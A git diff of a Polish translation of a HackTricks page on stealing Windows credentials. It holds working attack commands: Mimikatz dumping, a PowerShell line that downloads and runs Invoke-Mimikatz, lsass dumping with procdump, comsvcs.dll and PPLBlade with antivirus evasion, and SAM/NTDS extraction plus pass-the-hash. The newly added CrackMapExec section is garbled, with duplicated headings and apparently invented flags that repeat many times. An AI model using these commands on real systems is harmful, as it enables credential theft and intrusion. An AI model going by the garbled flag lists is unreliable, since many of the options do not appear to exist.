@@ -1,20 +1,20 @@
-# Kradzież poświadczeń systemu Windows
+# Kradzież poświadczeń Windows
 
 <details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naucz się hackingu AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF** Sprawdź [**PLANY SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytoriów** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 
-## Mimikatz - Kradzież poświadczeń
+## Poświadczenia Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -36,11 +36,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Dowiedz się tutaj o niektórych możliwych zabezpieczeniach danych uwierzytelniających.**](credentials-protections.md) **Te zabezpieczenia mogą zapobiec wydobyciu niektórych danych uwierzytelniających przez Mimikatz.**
+[**Dowiedz się więcej o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyciągnięcie niektórych poświadczeń.**
 
-## Dane uwierzytelniające z Meterpreter
+## Poświadczenia z Meterpreter
 
-Użyj [**wtyczki Credentials**](https://github.com/carlospolop/MSF-Credentials), **którą stworzyłem, aby przeszukać ofiarę w poszukiwaniu haseł i skrótów**.
+Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **który stworzyłem, aby** **wyszukiwać hasła i hashe** wewnątrz ofiary.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -61,10 +61,10 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-Ponieważ **Procdump od** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoftu**, nie jest wykrywany przez Defendera.\
-Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wydobycia** danych **uwierzytelniających lokalnie** z zrzutu.
+Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoft**, nie jest wykrywany przez Defendera.\
+Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wyodrębnienia** **poświadczeń lokalnie** ze zrzutu.
 
-{% code title="Zrzut lsass" %}
+{% code title="Dump lsass" %}
 ```bash
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -72,7 +72,13 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% code title="Wyodrębnianie poświadczeń z dumpa" %}
+{% endcode %}
+
+{% code title="Extract credentials from the dump" %}
+
+{% endcode %}
+
+{% code title="Extract credentials from the dump" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -83,44 +89,44 @@ mimikatz # sekurlsa::logonPasswords
 
 Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Uwaga**: Niektóre **AV** mogą **wykryć** jako **szkodliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ wykrywają ciągi **"procdump.exe" i "lsass.exe"**. Dlatego jest **bardziej skryte** przekazać jako **argument** PID lsass.exe do procdump **zamiast** nazwy lsass.exe.
+**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **bardziej ukryte** jest **przekazanie** jako **argument** **PID** lsass.exe do procdump **zamiast** **nazwy lsass.exe.**
 
 ### Zrzucanie lsass za pomocą **comsvcs.dll**
 
-Biblioteka DLL o nazwie **comsvcs.dll** znajdująca się w `C:\Windows\System32` jest odpowiedzialna za **zrzucanie pamięci procesu** w przypadku awarii. Ta biblioteka DLL zawiera funkcję o nazwie **`MiniDumpW`**, która jest uruchamiana za pomocą `rundll32.exe`.\
-Pierwsze dwa argumenty są nieistotne, ale trzeci argument składa się z trzech składników. Pierwszy składnik to identyfikator procesu, który ma zostać zrzutowany, drugi składnik to lokalizacja pliku zrzutu, a trzeci składnik to wyłącznie słowo **full**. Nie istnieją żadne alternatywne opcje.\
-Po analizie tych trzech składników biblioteka DLL tworzy plik zrzutu i przenosi pamięć określonego procesu do tego pliku.\
-Wykorzystanie biblioteki **comsvcs.dll** jest możliwe do zrzucania procesu lsass, eliminując tym samym konieczność przesyłania i uruchamiania procdump. Metoda ta jest szczegółowo opisana pod adresem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+DLL o nazwie **comsvcs.dll** znajdujący się w `C:\Windows\System32` jest odpowiedzialny za **zrzucanie pamięci procesu** w przypadku awarii. Ta DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywoływania za pomocą `rundll32.exe`.\
+Pierwsze dwa argumenty są nieistotne, ale trzeci jest podzielony na trzy komponenty. Pierwszy komponent to ID procesu do zrzutu, drugi to lokalizacja pliku zrzutu, a trzeci komponent to ściśle słowo **full**. Nie ma innych opcji.\
+Po przeanalizowaniu tych trzech komponentów, DLL angażuje się w tworzenie pliku zrzutu i przenoszenie pamięci określonego procesu do tego pliku.\
+Wykorzystanie **comsvcs.dll** jest możliwe do zrzucania procesu lsass, eliminując potrzebę przesyłania i uruchamiania procdump. Ta metoda jest szczegółowo opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-Do wykonania używane jest następujące polecenie:
+Do wykonania używa się następującego polecenia:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**Ten proces można zautomatyzować za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+**Możesz zautomatyzować ten proces za pomocą** [**lsassy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Wykonywanie zrzutu lsass za pomocą Menedżera zadań**
+### **Zrzucanie lsass za pomocą Menedżera zadań**
 
-1. Kliknij prawym przyciskiem myszy na pasku zadań i wybierz Menedżer zadań.
-2. Kliknij na "Więcej szczegółów".
-3. W zakładce Procesy wyszukaj proces "Local Security Authority Process".
-4. Kliknij prawym przyciskiem myszy na procesie "Local Security Authority Process" i wybierz "Utwórz plik zrzutu".
+1. Kliknij prawym przyciskiem myszy na Pasek zadań i wybierz Menedżer zadań
+2. Kliknij na Więcej szczegółów
+3. Wyszukaj proces "Local Security Authority Process" na karcie Procesy
+4. Kliknij prawym przyciskiem myszy na proces "Local Security Authority Process" i wybierz "Utwórz plik zrzutu".
 
-### Wykonywanie zrzutu lsass za pomocą procdump
+### Zrzucanie lsass za pomocą procdump
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, który jest częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpowanie lsass za pomocą PPLBlade
+## Dumpin lsass with PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do dumpowania chronionych procesów, które obsługuje zaciemnianie dumpów pamięci i przesyłanie ich na zdalne stanowiska robocze bez zapisywania ich na dysku.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzutu chronionych procesów, które obsługuje zaciemnianie zrzutu pamięci i przesyłanie go na zdalne stacje robocze bez zapisywania na dysku.
 
-**Główne funkcje**:
+**Kluczowe funkcjonalności**:
 
 1. Omijanie ochrony PPL
-2. Zaciemnianie plików dumpu pamięci w celu uniknięcia wykrycia przez mechanizmy sygnatur antywirusowych Defendera
-3. Przesyłanie dumpu pamięci za pomocą metod RAW i SMB bez zapisywania go na dysku (bezplikowy dump)
+2. Zaciemnianie plików zrzutu pamięci w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach Defendera
+3. Przesyłanie zrzutu pamięci metodami RAW i SMB bez zapisywania na dysku (zrzut bezplikowy)
 
 {% code overflow="wrap" %}
 ```bash
@@ -130,125 +136,851 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Wydobywanie haszy SAM
+### Dump SAM hashes
 
-CrackMapExec to narzędzie do testowania penetracyjnego, które można użyć do wydobywania haszy z bazy danych SAM w systemach Windows. Hasze SAM są przechowywane lokalnie na komputerze i zawierają uwierzytelnienie użytkowników systemu. Wydobywanie tych haszy może umożliwić złamanie haseł i uzyskanie dostępu do kont użytkowników. Aby wydobyć hasze SAM za pomocą CrackMapExec, wykonaj następujące kroki:
+### Zrzut haseł SAM
 
-1. Uruchom CrackMapExec na swoim systemie.
-2. Użyj polecenia `cme smb <target> -u <username> -p <password>` do nawiązania połączenia z docelowym systemem za pomocą protokołu SMB.
-3. Wykonaj polecenie `hashdump` w celu wydobywania haszy SAM z systemu.
-4. Otrzymane hasze można następnie użyć do próby złamania haseł lub do innych celów testowania penetracyjnego.
+```bash
+cme smb <target_ip> -u <username> -p <password> --sam
+```
 
-Wydobywanie haszy SAM jest przydatnym narzędziem w procesie testowania penetracyjnego, ponieważ umożliwia identyfikację słabych haseł i potencjalne podatności w systemach Windows. Pamiętaj jednak, że wydobywanie haszy bez zgody właściciela systemu jest nielegalne i może prowadzić do konsekwencji prawnych. Zawsze przestrzegaj odpowiednich przepisów i zasad etycznych podczas korzystania z narzędzi do testowania penetracyjnego.
+### Dump LSA Secrets
+
+### Zrzut LSA Secrets
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --lsa
+```
+
+### Dump NTDS.dit
+
+### Zrzut NTDS.dit
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --ntds
+```
+
+### Pass-the-Hash
+
+### Pass-the-Hash
+
+```bash
+cme smb <target_ip> -u <username> -H <hash>
+```
+
+### Pass-the-Ticket
+
+### Pass-the-Ticket
+
+```bash
+cme smb <target_ip> -k -no-pass
+```
+
+### Over-Pass-the-Hash (Pass-the-Key)
+
+### Over-Pass-the-Hash (Pass-the-Key)
+
+```bash
+cme smb <target_ip> -u <username> -p <password> -H <hash>
+```
+
+### Pass-the-Cache
+
+### Pass-the-Cache
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --ptc
+```
+
+### Enumerate shares
+
+### Enumeracja udziałów
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --shares
+```
+
+### Enumerate sessions
+
+### Enumeracja sesji
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --sessions
+```
+
+### Enumerate users
+
+### Enumeracja użytkowników
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --users
+```
+
+### Enumerate groups
+
+### Enumeracja grup
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --groups
+```
+
+### Enumerate logged on users
+
+### Enumeracja zalogowanych użytkowników
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --loggedon
+```
+
+### Enumerate local admins
+
+### Enumeracja lokalnych administratorów
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --local-admins
+```
+
+### Enumerate domain admins
+
+### Enumeracja administratorów domeny
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --domain-admins
+```
+
+### Enumerate password policy
+
+### Enumeracja polityki haseł
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --pass-pol
+```
+
+### Enumerate LAPS passwords
+
+### Enumeracja haseł LAPS
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --laps
+```
+
+### Enumerate GPP passwords
+
+### Enumeracja haseł GPP
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --gpp
+```
+
+### Enumerate SMB signing
+
+### Enumeracja podpisywania SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --signing
+```
+
+### Enumerate SMB version
+
+### Enumeracja wersji SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --smbv
+```
+
+### Enumerate SMB dialects
+
+### Enumeracja dialektów SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dialects
+```
+
+### Enumerate SMB security mode
+
+### Enumeracja trybu bezpieczeństwa SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --sec-mode
+```
+
+### Enumerate SMB capabilities
+
+### Enumeracja możliwości SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --capabilities
+```
+
+### Enumerate SMB OS
+
+### Enumeracja systemu operacyjnego SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --os
+```
+
+### Enumerate SMB domain
+
+### Enumeracja domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --domain
+```
+
+### Enumerate SMB FQDN
+
+### Enumeracja FQDN SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --fqdn
+```
+
+### Enumerate SMB NetBIOS
+
+### Enumeracja NetBIOS SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --netbios
+```
+
+### Enumerate SMB DNS
+
+### Enumeracja DNS SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dns
+```
+
+### Enumerate SMB domain SID
+
+### Enumeracja SID domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --domain-sid
+```
+
+### Enumerate SMB domain SID history
+
+### Enumeracja historii SID domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --sid-history
+```
+
+### Enumerate SMB domain trusts
+
+### Enumeracja zaufania domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --trusts
+```
+
+### Enumerate SMB domain controllers
+
+### Enumeracja kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs
+```
+
+### Enumerate SMB domain controllers FQDN
+
+### Enumeracja FQDN kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
+```
+
+### Enumerate SMB domain controllers NetBIOS
+
+### Enumeracja NetBIOS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-netbios
+```
+
+### Enumerate SMB domain controllers DNS
+
+### Enumeracja DNS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-dns
+```
+
+### Enumerate SMB domain controllers SID
+
+### Enumeracja SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid
+```
+
+### Enumerate SMB domain controllers SID history
+
+### Enumeracja historii SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
+```
+
+### Enumerate SMB domain controllers trusts
+
+### Enumeracja zaufania kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-trusts
+```
+
+### Enumerate SMB domain controllers capabilities
+
+### Enumeracja możliwości kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
+```
+
+### Enumerate SMB domain controllers OS
+
+### Enumeracja systemu operacyjnego kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-os
+```
+
+### Enumerate SMB domain controllers domain
+
+### Enumeracja domeny kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-domain
+```
+
+### Enumerate SMB domain controllers FQDN
+
+### Enumeracja FQDN kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
+```
+
+### Enumerate SMB domain controllers NetBIOS
+
+### Enumeracja NetBIOS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-netbios
+```
+
+### Enumerate SMB domain controllers DNS
+
+### Enumeracja DNS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-dns
+```
+
+### Enumerate SMB domain controllers SID
+
+### Enumeracja SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid
+```
+
+### Enumerate SMB domain controllers SID history
+
+### Enumeracja historii SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
+```
+
+### Enumerate SMB domain controllers trusts
+
+### Enumeracja zaufania kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-trusts
+```
+
+### Enumerate SMB domain controllers capabilities
+
+### Enumeracja możliwości kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
+```
+
+### Enumerate SMB domain controllers OS
+
+### Enumeracja systemu operacyjnego kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-os
+```
+
+### Enumerate SMB domain controllers domain
+
+### Enumeracja domeny kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-domain
+```
+
+### Enumerate SMB domain controllers FQDN
+
+### Enumeracja FQDN kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
+```
+
+### Enumerate SMB domain controllers NetBIOS
+
+### Enumeracja NetBIOS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-netbios
+```
+
+### Enumerate SMB domain controllers DNS
+
+### Enumeracja DNS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-dns
+```
+
+### Enumerate SMB domain controllers SID
+
+### Enumeracja SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid
+```
+
+### Enumerate SMB domain controllers SID history
+
+### Enumeracja historii SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
+```
+
+### Enumerate SMB domain controllers trusts
+
+### Enumeracja zaufania kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-trusts
+```
+
+### Enumerate SMB domain controllers capabilities
+
+### Enumeracja możliwości kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
+```
+
+### Enumerate SMB domain controllers OS
+
+### Enumeracja systemu operacyjnego kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-os
+```
+
+### Enumerate SMB domain controllers domain
+
+### Enumeracja domeny kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-domain
+```
+
+### Enumerate SMB domain controllers FQDN
+
+### Enumeracja FQDN kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
+```
+
+### Enumerate SMB domain controllers NetBIOS
+
+### Enumeracja NetBIOS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-netbios
+```
+
+### Enumerate SMB domain controllers DNS
+
+### Enumeracja DNS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-dns
+```
+
+### Enumerate SMB domain controllers SID
+
+### Enumeracja SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid
+```
+
+### Enumerate SMB domain controllers SID history
+
+### Enumeracja historii SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
+```
+
+### Enumerate SMB domain controllers trusts
+
+### Enumeracja zaufania kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-trusts
+```
+
+### Enumerate SMB domain controllers capabilities
+
+### Enumeracja możliwości kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
+```
+
+### Enumerate SMB domain controllers OS
+
+### Enumeracja systemu operacyjnego kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-os
+```
+
+### Enumerate SMB domain controllers domain
+
+### Enumeracja domeny kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-domain
+```
+
+### Enumerate SMB domain controllers FQDN
+
+### Enumeracja FQDN kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
+```
+
+### Enumerate SMB domain controllers NetBIOS
+
+### Enumeracja NetBIOS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-netbios
+```
+
+### Enumerate SMB domain controllers DNS
+
+### Enumeracja DNS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-dns
+```
+
+### Enumerate SMB domain controllers SID
+
+### Enumeracja SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid
+```
+
+### Enumerate SMB domain controllers SID history
+
+### Enumeracja historii SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
+```
+
+### Enumerate SMB domain controllers trusts
+
+### Enumeracja zaufania kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-trusts
+```
+
+### Enumerate SMB domain controllers capabilities
+
+### Enumeracja możliwości kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
+```
+
+### Enumerate SMB domain controllers OS
+
+### Enumeracja systemu operacyjnego kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-os
+```
+
+### Enumerate SMB domain controllers domain
+
+### Enumeracja domeny kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-domain
+```
+
+### Enumerate SMB domain controllers FQDN
+
+### Enumeracja FQDN kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
+```
+
+### Enumerate SMB domain controllers NetBIOS
+
+### Enumeracja NetBIOS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-netbios
+```
+
+### Enumerate SMB domain controllers DNS
+
+### Enumeracja DNS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-dns
+```
+
+### Enumerate SMB domain controllers SID
+
+### Enumeracja SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid
+```
+
+### Enumerate SMB domain controllers SID history
+
+### Enumeracja historii SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
+```
+
+### Enumerate SMB domain controllers trusts
+
+### Enumeracja zaufania kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-trusts
+```
+
+### Enumerate SMB domain controllers capabilities
+
+### Enumeracja możliwości kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
+```
+
+### Enumerate SMB domain controllers OS
+
+### Enumeracja systemu operacyjnego kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-os
+```
+
+### Enumerate SMB domain controllers domain
+
+### Enumeracja domeny kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-domain
+```
+
+### Enumerate SMB domain controllers FQDN
+
+### Enumeracja FQDN kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
+```
+
+### Enumerate SMB domain controllers NetBIOS
+
+### Enumeracja NetBIOS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-netbios
+```
+
+### Enumerate SMB domain controllers DNS
+
+### Enumeracja DNS kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-dns
+```
+
+### Enumerate SMB domain controllers SID
+
+### Enumeracja SID kontrolerów domeny SMB
+
+```bash
+cme smb <target_ip> -u <username> -p <password> --dcs-sid
+```
+
+### Enumerate SMB domain controllers SID
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Wykradanie sekretów LSA
+### Zrzut LSA secrets
 
-#### Opis
+LSA (Local Security Authority) przechowuje różne poufne dane, takie jak hasła użytkowników, klucze szyfrowania i inne tajne informacje. Można je zrzucić za pomocą `mimikatz`.
 
-Wykradanie sekretów LSA (Local Security Authority) to technika polegająca na pozyskiwaniu poufnych informacji przechowywanych w systemie Windows. Sekrety LSA obejmują m.in. hasła użytkowników, klucze szyfrujące, tokeny uwierzytelniające i certyfikaty.
+```shell
+mimikatz # sekurlsa::logonpasswords
+```
 
-#### Kroki
+### Dump SAM database
 
-1. Uruchom narzędzie `mimikatz` na docelowym systemie Windows.
+SAM (Security Account Manager) przechowuje hasła lokalnych kont użytkowników. Można je zrzucić za pomocą `reg` i `mimikatz`.
 
-2. Wprowadź polecenie `privilege::debug`, aby uzyskać uprawnienia debugowania.
+```shell
+reg save hklm\sam sam
+reg save hklm\system system
+mimikatz # lsadump::sam /system:system /sam:sam
+```
 
-3. Wykonaj polecenie `sekurlsa::logonpasswords`, aby wyświetlić poufne informacje uwierzytelniania.
+### Dump NTDS.dit
 
-4. Zapisz wyświetlone dane, aby móc je przeanalizować później.
+NTDS.dit to baza danych Active Directory, która przechowuje hasła wszystkich użytkowników w domenie. Można ją zrzucić za pomocą `ntdsutil` i `mimikatz`.
 
-#### Uwagi
+```shell
+ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+copy c:\temp\Active Directory\ntds.dit .
+copy c:\temp\registry\SYSTEM .
+mimikatz # lsadump::dcsync /user:Administrator
+```
 
-- Ta technika wymaga uprawnień administratora lub uprawnień debugowania.
+### Pass-the-Hash
 
-- Wykradanie sekretów LSA jest nielegalne i narusza prywatność innych osób. Używaj tej techniki tylko w celach edukacyjnych lub zgodnie z prawem.
+Pass-the-Hash to technika, która pozwala na uwierzytelnienie się jako użytkownik bez znajomości jego hasła, używając jedynie wartości hash NTLM.
+
+```shell
+mimikatz # sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe
+```
+
+### Pass-the-Ticket
+
+Pass-the-Ticket to technika, która pozwala na uwierzytelnienie się jako użytkownik, używając biletów Kerberos.
+
+```shell
+mimikatz # kerberos::ptt <ticket.kirbi>
+```
+
+### Over-Pass-the-Hash (Pass-the-Key)
+
+Over-Pass-the-Hash to technika, która pozwala na uwierzytelnienie się jako użytkownik, używając klucza Kerberos.
+
+```shell
+mimikatz # sekurlsa::pth /user:Administrator /domain:example.com /aes256:<key> /run:cmd.exe
+```
+
+### Kerberoasting
+
+Kerberoasting to technika, która pozwala na uzyskanie hashy haseł kont usługowych z biletów Kerberos.
+
+```shell
+mimikatz # kerberos::list /export
+```
+
+### DCSync
+
+DCSync to technika, która pozwala na symulowanie zachowania kontrolera domeny w celu uzyskania hashy haseł użytkowników.
+
+```shell
+mimikatz # lsadump::dcsync /user:Administrator
+```
+
+### Skeleton Key
+
+Skeleton Key to technika, która pozwala na wstrzyknięcie uniwersalnego hasła do kontrolera domeny, umożliwiając uwierzytelnienie się jako dowolny użytkownik.
+
+```shell
+mimikatz # misc::skeleton
+```
+
+### Mimikatz
+
+Mimikatz to narzędzie do uzyskiwania haseł, hashy, biletów i kluczy z pamięci systemu Windows.
+
+```shell
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+```
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Wydobądź plik NTDS.dit z docelowego kontrolera domeny (DC)
-
